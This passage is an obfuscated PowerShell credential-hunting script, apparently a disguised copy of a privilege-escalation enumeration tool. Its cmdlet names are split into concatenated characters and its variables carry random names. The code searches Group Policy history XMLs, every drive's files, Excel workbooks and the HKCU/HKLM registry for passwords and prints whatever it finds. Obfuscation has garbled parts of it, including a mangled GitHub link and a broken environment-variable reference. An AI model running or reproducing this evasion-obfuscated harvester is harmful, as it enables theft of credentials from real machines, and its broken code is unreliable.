    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "$_ Found!" -ForegroundColor red
  }
}

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Group Policy Password Check"

$vWZGBtOYYHPXQfPFrswOhUtUBNvhkfGdKWVKsVgUQtQZLmuCAlhmZmRXWOyPJXpEPqFrihxPCnPHhPgiLFwMiFyVIvLzpMvIyhxA = @("Groups.xml", "Services.xml", "Scheduledtasks.xml", "DataSources.xml", "Printers.xml", "Drives.xml")
if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemDrive\Microsoft\Group Policy\history") {
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Recurse -Force "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemDrive\Microsoft\Group Policy\history" -Include @GroupPolicy
}

if (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemDrive\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history" ) {
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Recurse -Force "$XQliEydMNlmTlvXtzFzbYpoDAfKdoUSFpJJQzELLTNVRaqIenvmXNaKUUtqGhKqVeHIAejMMZUPjIGPKDIWeRrgcSKqpqmGFLYSg:SystemDrive\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history"
}

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Recycle Bin TIP:"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "If credentials are found in the recycle bin, tool from nirsoft may assist: http://www.nirsoft.net/password_recovery_tools.html" -ForegroundColor Yellow


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========||  Password Check in Files/Folders"

if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Password Check. Starting at root of each drive. This will take some time. Like, grab a coffee or tea kinda time."
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Looking through each drive, searching for $yguUDIpaGJvtcNHDjbknXaKnStXBCnDMwjjOMsmSsBSWJndiYABXKOIyLiMyfPwUAklmgzCqbBmrasGdlKEWkIWSHitmgPGaxpHQ"
try { 
  &('N' + 'e' + 'w' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -ComObject Excel.Application | &('O' + 'u' + 't' + '-' + 'N' + 'u' + 'l' + 'l')
  $XNmSKHlVMUJhdMitMfQVbACDGAsGzuhyWxHDVhmtYScpbDcIoxuajhRwyBCbzuSsmPUrLYfwyCNQbFTBXSbZPaPmahHhaJDbVRyM = $true 
}
catch {
  $XNmSKHlVMUJhdMitMfQVbACDGAsGzuhyWxHDVhmtYScpbDcIoxuajhRwyBCbzuSsmPUrLYfwyCNQbFTBXSbZPaPmahHhaJDbVRyM = $false
  if($Excel) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Yellow "Host does not have Excel COM object, will still point out excel files when found."  
  }
}
$MrSwNdlGcGMMieEwFYlAwCjyRhvoYqLuBnZPimcMEufijJXWBlMARIGMxDrfbRjGosbtwfKsUYRgVYQmQrxpLTZkeOzCrOWvHJUE.Root | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy = $_
  &('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') $eFukGwjvejxWSJfHodUuEJMZcIwDAYZkUSrskPeBVYwsabXFeXkcmUYMmupXUHQHdizvtwajcXotTvMDENHHQEykGeVIkfsxwaNy -Recurse -Include $yguUDIpaGJvtcNHDjbknXaKnStXBCnDMwjjOMsmSsBSWJndiYABXKOIyLiMyfPwUAklmgzCqbBmrasGdlKEWkIWSHitmgPGaxpHQ -ErrorAction SilentlyContinue -Force | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF = $_
    if ($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName | &('s' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 's' + 't' + 'r' + 'i' + 'n' + 'g') "(?i).*lang.*"){
    }
    if($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') "(?i).:\\.*\\.*Pass.*"){
      &('w' + 'r' + 'i' + 't' + 'e' + '-' + 'h' + 'o' + 's' + 't') -ForegroundColor Blue "$($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName) contains the word 'pass'"
    }
    if($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') ".:\\.*\\.*user.*" ){
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "$($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName) contains the word 'user' -excluding the 'users' directory"
    }
    elseif ($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') ".*\.xls",".*\.xlsm",".*\.xlsx") {
      if ($XNmSKHlVMUJhdMitMfQVbACDGAsGzuhyWxHDVhmtYScpbDcIoxuajhRwyBCbzuSsmPUrLYfwyCNQbFTBXSbZPaPmahHhaJDbVRyM -and $Excel) {
        &('S' + 'e' + 'a' + 'r' + 'c' + 'h' + '-' + 'E' + 'x' + 'c' + 'e' + 'l') -Source $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName -SearchText "user"
        &('S' + 'e' + 'a' + 'r' + 'c' + 'h' + '-' + 'E' + 'x' + 'c' + 'e' + 'l') -Source $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName -SearchText "pass"
      }
    }
    else {
      if ($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.Length -gt 0) {
      }
      if ($OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') "(?i).*SiteList\.xml") {
        &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Possible MCaffee Site List Found: $($_.FullName)"
        &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Just going to leave this here: https://github.com/funoverip/&('m' + 'c' + 'a' + 'f' + 'e' + 'e' + '-' + 's' + 'i' + 't' + 'e' + 'l' + 'i' + 's' + 't')-&('p' + 'w' + 'd' + '-' + 'd' + 'e' + 'c' + 'r' + 'y' + 'p' + 't' + 'i' + 'o' + 'n')" -ForegroundColor Yellow
      }
      $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.keys | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
        $kkpgvQuiHVFlixzSjVumtRGTKiCLkuDpnEwjJCrZblwloiityuyvQhiRdnLijewTqjptQTgyziaGeMFbtciXzXhlsOVIGyphDSXy = &('G' + 'e' + 't' + '-' + 'C' + 'o' + 'n' + 't' + 'e' + 'n' + 't') $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName -ErrorAction SilentlyContinue -Force | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh[$_] -Context 1, 1
        if ($kkpgvQuiHVFlixzSjVumtRGTKiCLkuDpnEwjJCrZblwloiityuyvQhiRdnLijewTqjptQTgyziaGeMFbtciXzXhlsOVIGyphDSXy) {
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Possible Password found: $_" -ForegroundColor Yellow
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $OlQpobFMPNgNUwgNTRyJzApMRcAVuTtkRskzoRoqcAdiyQrWcvpDlujQRxHuzATQoNjezZNxsAiKozkbwQloeyaZKOXgPvYPtRdF.FullName
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "$_ triggered"
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $kkpgvQuiHVFlixzSjVumtRGTKiCLkuDpnEwjJCrZblwloiityuyvQhiRdnLijewTqjptQTgyziaGeMFbtciXzXhlsOVIGyphDSXy -ForegroundColor Red
        }
      }
    }  
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Registry Password Check"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "This will take some time. Won't you have a pepsi?"
$pyOUcensmimfLISKWoelZDAIlDvwPXeHnzgkpPNZMOuaMXSpujXcZDLtXcywYMwZkBZsGiAgKOiwFrMGnMyHXyVehdSmseNgillT = @("registry::\HKEY_CURRENT_USER\", "registry::\HKEY_LOCAL_MACHINE\")
foreach ($dHDIJURLntxnnWYWeZGFgEhosKWZDlJHrGktVMtaFjWcizmpijshlcRCdJvBqAdGbsHOhQjagcqsnRDKtsYqlNykptrQaoLrOWpX in $pyOUcensmimfLISKWoelZDAIlDvwPXeHnzgkpPNZMOuaMXSpujXcZDLtXcywYMwZkBZsGiAgKOiwFrMGnMyHXyVehdSmseNgillT) {
(&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') -Path $dHDIJURLntxnnWYWeZGFgEhosKWZDlJHrGktVMtaFjWcizmpijshlcRCdJvBqAdGbsHOhQjagcqsnRDKtsYqlNykptrQaoLrOWpX -Recurse -Force -ErrorAction SilentlyContinue) | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv = $_.property
    $ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz = $_.Name
    $fleGFJSdMHgKGhBfLAouHLmzjKxkzniGNnOovGUaDFyyMwoxyNZoAtVwJdXmlgowckGkqaQticoihKPYdjwfcJgXCkqCIURKNhNv | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
      $YGsXEZLVFgbZOcIatWHCUAeJDcWGETyEzHpEswKLxNNTwLcGtFVpPgMpbpfSfIiLxjSLUKTxiRThNxcFJGacyEvPweLYJGndCHQm = $_
      $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh.keys | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
        $EPbpiSJudhfXNTcIPUCGuvlsVuwgKhlAJXLqeUYffJXfbsMeEaKBjfCGsPmwBMhxuVpAYqmtTNWriShOMIdbSWNtaSjPEuvyqodr = $BJbQjlyMxOXcRfjhQsNaApeStkICxqyVABBDdEEsKjqoUBwuKKyJTBFnvKNTqhqeJeJNjTJSaOluvTaXLBNXuqPboPsbQSDcatGh[$_]
        if ($YGsXEZLVFgbZOcIatWHCUAeJDcWGETyEzHpEswKLxNNTwLcGtFVpPgMpbpfSfIiLxjSLUKTxiRThNxcFJGacyEvPweLYJGndCHQm | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_ -like $EPbpiSJudhfXNTcIPUCGuvlsVuwgKhlAJXLqeUYffJXfbsMeEaKBjfCGsPmwBMhxuVpAYqmtTNWriShOMIdbSWNtaSjPEuvyqodr }) {
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Possible Password Found: $ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz\$YGsXEZLVFgbZOcIatWHCUAeJDcWGETyEzHpEswKLxNNTwLcGtFVpPgMpbpfSfIiLxjSLUKTxiRThNxcFJGacyEvPweLYJGndCHQm"
          &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Key: $_" -ForegroundColor Red
        }
        $YGsXEZLVFgbZOcIatWHCUAeJDcWGETyEzHpEswKLxNNTwLcGtFVpPgMpbpfSfIiLxjSLUKTxiRThNxcFJGacyEvPweLYJGndCHQm | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {   
          $uGnSvrOOVVBZcPXPyjyyBpYxncsEvgWykBgfDZEPnxSCoROVniCBUzaoiuvaIUwXsCOmmhaMpuwkfxBjrjjWtpcQPsmjPsezPJOa = (&('G' + 'e' + 't' + '-' + 'I' + 't' + 'e' + 'm' + 'P' + 'r' + 'o' + 'p' + 'e' + 'r' + 't' + 'y') "registry::$ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz").$_
          if ($uGnSvrOOVVBZcPXPyjyyBpYxncsEvgWykBgfDZEPnxSCoROVniCBUzaoiuvaIUwXsCOmmhaMpuwkfxBjrjjWtpcQPsmjPsezPJOa | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_ -like $EPbpiSJudhfXNTcIPUCGuvlsVuwgKhlAJXLqeUYffJXfbsMeEaKBjfCGsPmwBMhxuVpAYqmtTNWriShOMIdbSWNtaSjPEuvyqodr }) {
            &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Possible Password Found: $ssWkiSwkzsOuwAmGtJjPCftbmJwyjHNcWRZFyInHsPKlHnKXGPHvaqWQuNfvzUJOctlmBKWPkqXsQtHpvTQWzuLkGMoVivreXkDz\$_ $uGnSvrOOVVBZcPXPyjyyBpYxncsEvgWykBgfDZEPnxSCoROVniCBUzaoiuvaIUwXsCOmmhaMpuwkfxBjrjjWtpcQPsmjPsezPJOa"
          }
        }
      }
    }
  }
  if ($TimeStamp) { TimeElapsed }
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Finished $dHDIJURLntxnnWYWeZGFgEhosKWZDlJHrGktVMtaFjWcizmpijshlcRCdJvBqAdGbsHOhQjagcqsnRDKtsYqlNykptrQaoLrOWpX"
}


